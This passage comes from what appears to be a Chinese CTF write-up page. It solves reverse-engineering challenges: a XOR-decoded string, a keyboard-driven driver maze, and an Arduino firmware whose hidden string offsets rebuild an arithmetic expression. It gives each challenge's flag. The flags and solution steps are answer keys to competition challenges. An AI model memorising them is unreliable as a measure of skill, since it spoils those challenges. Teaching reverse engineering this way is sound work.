class="number">4</span>,<span class="number">2</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">128</span>,<span class="number">48</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">192</span>,<span class="number">48</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">48</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">192</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">192</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">64</span>,<span class="number">48</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">1</span>]</span><br><span class="line">a=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(secret)):</span><br><span class="line">    a+=chr(secret[i]^xor[<span class="number">4</span>*i]^xor[<span class="number">4</span>*i+<span class="number">1</span>]^xor[<span class="number">4</span>*i+<span class="number">2</span>]^xor[<span class="number">4</span>*i+<span class="number">3</span>])</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>解密后： <code>Agn0zNSXENvTAv9lmg5HDdrFtw8ZFq==</code> 它的base64加密大小写是反的，手动换一下= = <code>aGN0ZnsxenVtaV9LMG5hdDRfTW8zfQ==</code></p><blockquote><p><code>hctf{1zumi_K0nat4_Mo3</code></p></blockquote><h2><span id="seven">seven</span></h2><p>又是驱动逆向 sub_140001000中kbdclass应该跟键盘有关，但不知道怎么输入的 sub_1400012F0应该是解密函数了 中间有一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( *v6 == <span class="number">0x11</span> )                        <span class="comment">// up</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &amp; <span class="number">0xFFFFFFF0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 -= <span class="number">0x10</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        &#125;</span><br><span class="line">        v5 += <span class="number">0xD0</span>;</span><br><span class="line">        dword_1400030E4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 != <span class="number">0x1F</span> )                         <span class="comment">// down</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">if</span> ( (v5 &amp; <span class="number">0xFFFFFFF0</span>) == <span class="number">0xD0</span> )</span><br><span class="line">        v5 -= <span class="number">0xD0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v5 += <span class="number">0x10</span>;</span><br><span class="line">LABEL_13:</span><br><span class="line">      dword_1400030E4 = v5;</span><br><span class="line">LABEL_14:</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">0x1E</span> )                           <span class="comment">// left</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &amp; <span class="number">0xF</span> )</span><br><span class="line">          --v5;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v5 += <span class="number">0xF</span>;</span><br><span class="line">        dword_1400030E4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">0x20</span> )                           <span class="comment">// right</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v5 &amp; <span class="number">0xF</span>) == <span class="number">15</span> )</span><br><span class="line">          v5 -= <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          ++v5;</span><br><span class="line">        dword_1400030E4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = aO[v5];</span><br><span class="line">      <span class="keyword">if</span> ( v9 == <span class="string">'*'</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="string">"-1s\n"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9 != <span class="string">'7'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_29:</span><br><span class="line">          aO[v5] = <span class="string">'o'</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = <span class="string">"The input is the flag!\n"</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>aO为字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">****************</span><br><span class="line">o..............*</span><br><span class="line">**************.*</span><br><span class="line">************...*</span><br><span class="line">***********..***</span><br><span class="line">**********..****</span><br><span class="line">*********..*****</span><br><span class="line">********..******</span><br><span class="line">*******..*******</span><br><span class="line">******..********</span><br><span class="line">*****..*********</span><br><span class="line">****..**********</span><br><span class="line">****7***********</span><br></pre></td></tr></table></figure><p><code>****************</code> 要把这个o走到7的位置 0x11 0x1F 0x1E 0x20是硬件扫描码 wsad，对应写出移动的顺序就行了</p><p>https://blog.csdn.net/wangyi_lin/article/details/9016125 https://bbs.pediy.com/thread-218363.htm</p><blockquote><p><code>flag:hctf{ddddddddddddddssaasasasasasasasasas}</code></p></blockquote><h2><span id="polishduck">PolishDuck</span></h2><p>找到了字符串 Arduino leonardo，是单片机的型号. 该题是AVR汇编, 应该是一道算法题, 转成bin之后能看到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">44646 + ( 64094 + (71825 * ( ( 15873 + ( 21793 * ( 7234 + ( 17649 * ( ( 2155 + ( 74767 * ( 35392 + ( 88216 * ( 83920 + ( 16270 + ( 20151 * ( 5268 + ( 90693 * ( 82773 + ( 716 + 27377 * ( 44329 + ( 49366 * ( ( ( 38790 + ( 70247 * ( 97233 + ( 18347 + ( 22117 * ( ( ( 72576 + ( ( 47541 + ( 46975 + ( 53769 * ( 94005 + ( ( 72914 + ( 5137 + ( 87544 * 71583 + ( 20370 + ( 37968 * ( 17478 + ( ( 40532 + ( 10089 + ( 13332 * ( ( 24170 + ( 46845 * ( 16048 + 23142 * ( 31895 + ( 62386 * ( 12179 ( 94552 + ( ( ( 52918 + ( 91580 + ( ( ( 38412 + ( 91537 * ( 70 + ( 98594 * ( ( 35275 + ( 62912 * ( 4755 + ( 16737 * ( 27595 + ( ( 43551 + ( 64482 * 3550 ) ) - 21031 ) ) ) ) ) ) - 57553 ) ) - 89883 ) - 38900 ) ) ) - 19517 ) - 79082 ) ) ) ) ) ) ) ) - 70643 ) ) 55350 ) ) ) ) ) - 40301 ) ) ) ) - 83065 ) ) ) ) ) - 52460 ) ) - 49428 ) - 94686 ) ) ) ) ) ) - 1653 ) - 65217 ) ) ) - 43827 ) 66562 ) )</span><br></pre></td></tr></table></figure><p>但好像不是一个完整的等式, 无法解出...emmmm</p><p>做法是瞎猜的，没想到能做出来= = 这是个hex文件，首先不知道它机器的芯片，先用ida直接打开，能看到解析后的内容，也可以用相关工具解析成bin再用ida打开。发现0180地址出有一串字符串Arduino LLC Arduino Leonardo 这是它机器的型号，查找资料知道是avr架构的ATmega32u ida打开的时候，processer type 选Atmel AVR，打开后选ATmega32_L，可以反汇编了。 在0D40地址看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad.exe 44646 + ( 64094 + (71825 * ( ( 15873 + ( 21793 * ( 7234 + ( 17649 * ( ( 2155 + ( 74767 * ( 35392 + ( 88216 * ( 83920 + ( 16270 + ( 20151 * ( 5268 + ( 90693 * ( 82773 + ( 716 + 27377 * ( 44329 + ( 49366 * ( ( ( 38790 + ( 70247 * ( 97233 + ( 18347 + ( 22117 * ( ( ( 72576 + ( ( 47541 + ( 46975 + ( 53769 * ( 94005 + ( ( 72914 + ( 5137 + ( 87544 * 71583 + ( 20370 + ( 37968 * ( 17478 + ( ( 40532 + ( 10089 + ( 13332 * ( ( 24170 + ( 46845 * ( 16048 + 23142 * ( 31895 + ( 62386 * ( 12179 ( 94552 + ( ( ( 52918 + ( 91580 + ( ( ( 38412 + ( 91537 * ( 70 + ( 98594 * ( ( 35275 + ( 62912 * ( 4755 + ( 16737 * ( 27595 + ( ( 43551 + ( 64482 * 3550 ) ) - 21031 ) ) ) ) ) ) - 57553 ) ) - 89883 ) - 38900 ) ) ) - 19517 ) - 79082 ) ) ) ) ) ) ) ) - 70643 ) ) 55350 ) ) ) ) ) - 40301 ) ) ) ) - 83065 ) ) ) ) ) - 52460 ) ) - 49428 ) - 94686 ) ) ) ) ) ) - 1653 ) - 65217 ) ) ) - 43827 ) 66562 ) )</span><br></pre></td></tr></table></figure><p>不是一个完整的式子，不能计算，想起他方向。 这不是一个 完整的字符串，而是很多个字符串（中间有），大致猜一下可能是选取其中某些字符串拼接起来，就能计算了 从开头开始跟踪，跟踪到sub_9A8，应该是解析相关的函数了。 往下找，找到可疑的地方0A6C开始：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">ROM:0A6C                 ldi     r22, 0xF4</span><br><span class="line">ROM:0A6D                 ldi     r23, 1</span><br><span class="line">ROM:0A6E                 ldi     r24, 0</span><br><span class="line">ROM:0A6F                 ldi     r25, 0</span><br><span class="line">ROM:0A70                 call    sub_8B6</span><br><span class="line">ROM:0A72                 ldi     r24, 0x40 ; &apos;@&apos;</span><br><span class="line">ROM:0A73                 ldi     r25, 1</span><br><span class="line">ROM:0A74                 call    sub_88D</span><br><span class="line">ROM:0A76                 ldi     r22, 0xF4</span><br><span class="line">ROM:0A77                 ldi     r23, 1</span><br><span class="line">ROM:0A78                 ldi     r24, 0</span><br><span class="line">ROM:0A79                 ldi     r25, 0</span><br><span class="line">ROM:0A7A                 call    sub_8B6</span><br><span class="line">ROM:0A7C                 ldi     r24, 0x4C ; &apos;L&apos;</span><br><span class="line">ROM:0A7D                 ldi     r25, 1</span><br><span class="line">ROM:0A7E                 call    sub_88D</span><br><span class="line">ROM:0A80                 ldi     r22, 0xF4</span><br><span class="line">ROM:0A81                 ldi     r23, 1</span><br><span class="line">ROM:0A82                 ldi     r24, 0</span><br><span class="line">ROM:0A83                 ldi     r25, 0</span><br><span class="line">ROM:0A84                 call    sub_8B6</span><br><span class="line">ROM:0A86                 ldi     r24, 0x53 ; &apos;S&apos;</span><br><span class="line">ROM:0A87                 ldi     r25, 1</span><br><span class="line">ROM:0A88                 call    sub_88D</span><br><span class="line">ROM:0A8A                 ldi     r22, 0xF4</span><br><span class="line">ROM:0A8B                 ldi     r23, 1</span><br><span class="line">ROM:0A8C                 ldi     r24, 0</span><br><span class="line">ROM:0A8D                 ldi     r25, 0</span><br><span class="line">ROM:0A8E                 call    sub_8B6</span><br><span class="line">ROM:0A90                 ldi     r24, 0x62 ; &apos;b&apos;</span><br><span class="line">ROM:0A91                 ldi     r25, 1</span><br><span class="line">ROM:0A92                 call    sub_88D</span><br></pre></td></tr></table></figure><p>有很多结构十分相似的部分，把不一样的地方都提取出来，是一堆地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">140  14C  153  162  177  18B  1A9  1C8  1D3  1EB  1FE  25E  207 21C 227 246 261 270 28B 298 2A3 2B1 25C 2BA 2C5 2D0 2D7 2F2 307 310 25E 327 346 3DC 34D 364 373 38F 3A6 3B3 3BF 3D0 3DF 3EF 400 44B 413 42C 43B 44F 452 490 45F 46C 47D 48E 497 49E 4B5 4CB 445 445 4D6 44D 44D 494 4E5 44F</span><br></pre></td></tr></table></figure><p>这些地址并不指向任何东西，但如过把140对应之前字符串的开头notepad.exe，14C刚好能对应第二个字符串开头44646，以此类推，而某些地址可能指向的不是某一字符串的开头，这样猜测整合完应该能得到完整算术式 试着把他们一一对应过去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unsigned char secret[] = &#123; 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E, 0x65, 0x78,0x65, 0x00, 0x34, 0x34, 0x36, 0x34, 0x36, 0x20, 0x00, 0x2B,0x20, 0x28, 0x20, 0x36, 0x34, 0x30, 0x39, 0x34, 0x20, 0x2B,0x20, 0x28, 0x20, 0x00, 0x37, 0x31, 0x38, 0x32, 0x35, 0x20,0x2A, 0x20, 0x28, 0x20, 0x28, 0x20, 0x31, 0x35, 0x38, 0x37,0x33, 0x20, 0x2B, 0x20, 0x00, 0x28, 0x20, 0x32, 0x31, 0x37,0x39, 0x33, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x37, 0x32, 0x33,0x34, 0x20, 0x2B, 0x20, 0x00, 0x28, 0x20, 0x31, 0x37, 0x36,0x34, 0x39, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x28, 0x20, 0x32,0x31, 0x35, 0x35, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x37, 0x34,0x37, 0x36, 0x37, 0x20, 0x00, 0x2A, 0x20, 0x28, 0x20, 0x33,0x35, 0x33, 0x39, 0x32, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x38,0x38, 0x32, 0x31, 0x36, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x38,0x33, 0x39, 0x32, 0x30, 0x20, 0x00, 0x2B, 0x20, 0x28, 0x20,0x31, 0x36, 0x32, 0x37, 0x30, 0x20, 0x00, 0x2B, 0x20, 0x28,0x20, 0x32, 0x30, 0x31, 0x35, 0x31, 0x20, 0x2A, 0x20, 0x28,0x20, 0x35, 0x32, 0x36, 0x38, 0x20, 0x2B, 0x20, 0x28, 0x20,0x00, 0x39, 0x30, 0x36, 0x39, 0x33, 0x20, 0x2A, 0x20, 0x28,0x20, 0x38, 0x32, 0x37, 0x37, 0x33, 0x20, 0x2B, 0x20, 0x00,0x28, 0x20, 0x37, 0x31, 0x36, 0x20, 0x2B, 0x20, 0x00, 0x32,0x37, 0x33, 0x37, 0x37, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x34,0x34, 0x33, 0x32, 0x39, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x00,0x34, 0x39, 0x33, 0x36, 0x36, 0x20, 0x2A, 0x20, 0x28, 0x20,0x00, 0x28, 0x20, 0x28, 0x20, 0x33, 0x38, 0x37, 0x39, 0x30,0x20, 0x2B, 0x20, 0x28, 0x20, 0x37, 0x30, 0x32, 0x34, 0x37,0x20, 0x2A, 0x20, 0x28, 0x20, 0x39, 0x37, 0x32, 0x33, 0x33,0x20, 0x00, 0x2B, 0x20, 0x28, 0x20, 0x31, 0x38, 0x33, 0x34,0x37, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x32, 0x32, 0x31, 0x31,0x37, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x28, 0x20, 0x00, 0x28,0x20, 0x37, 0x32, 0x35, 0x37, 0x36, 0x20, 0x2B, 0x20, 0x28,0x20, 0x28, 0x20, 0x00, 0x34, 0x37, 0x35, 0x34, 0x31, 0x20,0x2B, 0x20, 0x28, 0x20, 0x34, 0x36, 0x39, 0x37, 0x35, 0x20,0x2B, 0x20, 0x28, 0x20, 0x35, 0x33, 0x37, 0x36, 0x39, 0x20,0x00, 0x2A, 0x20, 0x28, 0x20, 0x39, 0x34, 0x30, 0x30, 0x35,0x20, 0x2B, 0x20, 0x00, 0x28, 0x20, 0x28, 0x20, 0x37, 0x32,0x39, 0x31, 0x34, 0x20, 0x00, 0x2B, 0x20, 0x28, 0x20, 0x35,0x31, 0x33, 0x37, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x00, 0x38,0x37, 0x35, 0x34, 0x34, 0x20, 0x2A, 0x20, 0x00, 0x37, 0x31,0x35, 0x38, 0x33, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x00, 0x32,0x30, 0x33, 0x37, 0x30, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x00,0x33, 0x37, 0x39, 0x36, 0x38, 0x20, 0x00, 0x2A, 0x20, 0x28,0x20, 0x31, 0x37, 0x34, 0x37, 0x38, 0x20, 0x2B, 0x20, 0x28,0x20, 0x28, 0x20, 0x34, 0x30, 0x35, 0x33, 0x32, 0x20, 0x2B,0x20, 0x28, 0x20, 0x00, 0x31, 0x30, 0x30, 0x38, 0x39, 0x20,0x2B, 0x20, 0x28, 0x20, 0x31, 0x33, 0x33, 0x33, 0x32, 0x20,0x2A, 0x20, 0x28, 0x20, 0x00, 0x28, 0x20, 0x32, 0x34, 0x31,0x37, 0x30, 0x20, 0x00, 0x2B, 0x20, 0x28, 0x20, 0x34, 0x36,0x38, 0x34, 0x35, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x31, 0x36,0x30, 0x34, 0x38, 0x20, 0x2B, 0x20, 0x00, 0x32, 0x33, 0x31,0x34, 0x32, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x33, 0x31, 0x38,0x39, 0x35, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x36, 0x32, 0x33,0x38, 0x36, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x00, 0x31, 0x32,0x31, 0x37, 0x39, 0x20, 0x00, 0x28, 0x20, 0x39, 0x34, 0x35,0x35, 0x32, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x28, 0x20, 0x28,0x20, 0x35, 0x32, 0x39, 0x31, 0x38, 0x20, 0x00, 0x2B, 0x20,0x28, 0x20, 0x39, 0x31, 0x35, 0x38, 0x30, 0x20, 0x2B, 0x20,0x28, 0x20, 0x00, 0x28, 0x20, 0x28, 0x20, 0x33, 0x38, 0x34,0x31, 0x32, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x39, 0x31, 0x35,0x33, 0x37, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x37, 0x30, 0x20,0x00, 0x2B, 0x20, 0x28, 0x20, 0x39, 0x38, 0x35, 0x39, 0x34,0x20, 0x2A, 0x20, 0x28, 0x20, 0x28, 0x20, 0x33, 0x35, 0x32,0x37, 0x35, 0x20, 0x00, 0x2B, 0x20, 0x28, 0x20, 0x36, 0x32,0x39, 0x31, 0x32, 0x20, 0x2A, 0x20, 0x00, 0x28, 0x20, 0x34,0x37, 0x35, 0x35, 0x20, 0x2B, 0x20, 0x28, 0x20, 0x00, 0x31,0x36, 0x37, 0x33, 0x37, 0x20, 0x2A, 0x20, 0x28, 0x20, 0x32,0x37, 0x35, 0x39, 0x35, 0x20, 0x00, 0x2B, 0x20, 0x28, 0x20,0x28, 0x20, 0x34, 0x33, 0x35, 0x35, 0x31, 0x20, 0x2B, 0x20,0x00, 0x28, 0x20, 0x36, 0x34, 0x34, 0x38, 0x32, 0x20, 0x2A,0x20, 0x33, 0x35, 0x35, 0x30, 0x20, 0x00, 0x29, 0x20, 0x29,0x20, 0x2D, 0x20, 0x32, 0x31, 0x30, 0x33, 0x31, 0x20, 0x29,0x20, 0x29, 0x20, 0x00, 0x29, 0x20, 0x29, 0x20, 0x29, 0x20,0x29, 0x20, 0x2D, 0x20, 0x35, 0x37, 0x35, 0x35, 0x33, 0x20,0x29, 0x20, 0x00, 0x29, 0x20, 0x2D, 0x20, 0x38, 0x39, 0x38,0x38, 0x33, 0x20, 0x29, 0x20, 0x2D, 0x20, 0x33, 0x38, 0x39,0x30, 0x30, 0x20, 0x29, 0x20, 0x29, 0x20, 0x00, 0x29, 0x20,0x2D, 0x20, 0x31, 0x39, 0x35, 0x31, 0x37, 0x20, 0x29, 0x20,0x2D, 0x20, 0x00, 0x37, 0x39, 0x30, 0x38, 0x32, 0x20, 0x29,0x20, 0x29, 0x20, 0x29, 0x20, 0x29, 0x20, 0x29, 0x20, 0x29,0x20, 0x29, 0x20, 0x29, 0x20, 0x00, 0x2D, 0x20, 0x37, 0x30,0x36, 0x34, 0x33, 0x20, 0x29, 0x20, 0x29, 0x20, 0x00, 0x35,0x35, 0x33, 0x35, 0x30, 0x20, 0x29, 0x20, 0x29, 0x20, 0x29,0x20, 0x00, 0x29, 0x20, 0x29, 0x20, 0x2D, 0x20, 0x34, 0x30,0x33, 0x30, 0x31, 0x20, 0x29, 0x20, 0x29, 0x20, 0x00, 0x29,0x20, 0x29, 0x20, 0x2D, 0x20, 0x38, 0x33, 0x30, 0x36, 0x35,0x20, 0x29, 0x20, 0x29, 0x20, 0x00, 0x29, 0x20, 0x29, 0x20,0x29, 0x20, 0x2D, 0x20, 0x00, 0x35, 0x32, 0x34, 0x36, 0x30,0x20, 0x00, 0x29, 0x20, 0x29, 0x20, 0x2D, 0x20, 0x34, 0x39,0x34, 0x32, 0x38, 0x20, 0x29, 0x20, 0x2D, 0x20, 0x39, 0x34,0x36, 0x38, 0x36, 0x20, 0x00, 0x29, 0x20, 0x29, 0x20, 0x29,0x20, 0x29, 0x20, 0x29, 0x20, 0x29, 0x20, 0x2D, 0x20, 0x31,0x36, 0x35, 0x33, 0x20, 0x29, 0x20, 0x00, 0x2D, 0x20, 0x36,0x35, 0x32, 0x31, 0x37, 0x20, 0x29, 0x20, 0x00, 0x29, 0x20,0x29, 0x20, 0x2D, 0x20, 0x34, 0x33, 0x38, 0x32, 0x37, 0x20,0x29, 0x20, 0x00, 0x36, 0x36, 0x35, 0x36, 0x32, 0x20, 0x29,0x20, 0x29, 0x20, 0x00 &#125;;</span><br><span class="line">unsigned char *p;</span><br><span class="line">int address[] = &#123; 0x140 ,0x14C ,0x153 ,0x162 ,0x177 ,0x18B ,0x1A9 ,0x1C8 ,0x1D3 ,0x1EB ,0x1FE ,0x25E ,0x207,0x21C,0x227,0x246,0x261,0x270,0x28B,0x298,0x2A3,0x2B1,0x25C,0x2BA,0x2C5,0x2D0,0x2D7,0x2F2,0x307,0x310,0x25E,0x327,0x346,0x3DC,0x34D,0x364,0x373,0x38F,0x3A6,0x3B3,0x3BF,0x3D0,0x3DF,0x3EF,0x400,0x44B,0x413,0x42C,0x43B,0x44F,0x452,0x490,0x45F,0x46C,0x47D,0x48E,0x497,0x49E,0x4B5,0x4CB,0x445,0x445,0x4D6,0x44D,0x44D,0x494,0x4E5,0x44F &#125;;</span><br><span class="line">int i;</span><br><span class="line">for (i = 0; i &lt; 68; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = &amp;secret[0] + address[i]-0x140;</span><br><span class="line">cout &lt;&lt; p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到完整的算术表达式，用python算出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">44646</span> + ( <span class="number">64094</span> + ( <span class="number">71825</span> * ( ( <span class="number">15873</span> + ( <span class="number">21793</span> * ( <span class="number">7234</span> + ( <span class="number">17649</span> * ( ( <span class="number">2155</span> + ( <span class="number">74767</span> * ( <span class="number">35392</span> + ( <span class="number">88216</span> * ( <span class="number">83920</span> + ( <span class="number">16270</span> + ( <span class="number">20151</span> * ( <span class="number">5268</span> + ( <span class="number">90693</span> * ( <span class="number">82773</span> + ( <span class="number">716</span> + ( <span class="number">27377</span> * ( <span class="number">44329</span> + ( <span class="number">49366</span> * ( ( ( <span class="number">38790</span> + ( <span class="number">70247</span> * ( <span class="number">97233</span> + ( <span class="number">18347</span> + ( <span class="number">22117</span> * ( ( ( <span class="number">72576</span> + ( ( <span class="number">47541</span> + ( <span class="number">46975</span> + ( <span class="number">53769</span> * ( <span class="number">94005</span> + ( ( <span class="number">72914</span> + ( <span class="number">5137</span> + ( <span class="number">87544</span> * ( ( <span class="number">71583</span> + ( <span class="number">20370</span> + ( <span class="number">37968</span> * ( <span class="number">17478</span> + ( ( <span class="number">40532</span> + ( <span class="number">10089</span> + ( <span class="number">13332</span> * ( ( <span class="number">24170</span> + ( <span class="number">46845</span> * ( <span class="number">16048</span> + ( <span class="number">23142</span> * ( <span class="number">31895</span> + ( <span class="number">62386</span> * ( <span class="number">12179</span> + ( <span class="number">94552</span> + ( ( ( <span class="number">52918</span> + ( <span class="number">91580</span> + ( ( ( <span class="number">38412</span> + ( <span class="number">91537</span> * ( <span class="number">70</span> + ( <span class="number">98594</span> * ( ( <span class="number">35275</span> + ( <span class="number">62912</span> * ( <span class="number">4755</span> + ( <span class="number">16737</span> * ( <span class="number">27595</span> + ( ( <span class="number">43551</span> + ( <span class="number">64482</span> * <span class="number">3550</span> ) ) - <span class="number">21031</span> ) ) ) ) ) ) - <span class="number">57553</span> ) ) ) ) ) - <span class="number">89883</span> ) - <span class="number">38900</span> ) ) ) - <span class="number">19517</span> ) - <span class="number">79082</span> ) ) ) ) ) ) ) ) ) - <span class="number">70643</span> ) ) ) ) - <span class="number">55350</span> ) ) ) ) ) - <span class="number">40301</span> ) ) ) ) - <span class="number">83065</span> ) ) ) ) ) - <span class="number">52460</span> ) ) - <span class="number">49428</span> ) - <span class="number">94686</span> ) ) ) ) ) ) - <span class="number">1653</span> ) - <span class="number">65217</span> ) ) ) ) ) ) ) ) ) ) ) ) ) ) ) - <span class="number">43827</span> ) ) ) ) ) - <span class="number">66562</span> ) ) ) </span><br><span class="line">s=hex(a)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><blockquote><p><code>flag:hctf{P0l1sh_Duck_Tast3s_D3l1ci0us_D0_U_Th1nk?}</code></p></blockquote><h1><span id="crypto">Crypto</span></h1><h2><span id="xor-game">xor game</span></h2><p>加密方式是一个key对明文循环异或。可以通过统计词频逐步确定key的长度，key每一字节可能的字符，并最终确定key。 详见：https://findneo.github.io/171005NuptVigenereWP/ &gt; <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">## xor?rsa</span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">gcd(e,(p-1)*(q-1)) ==  1 或 5</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 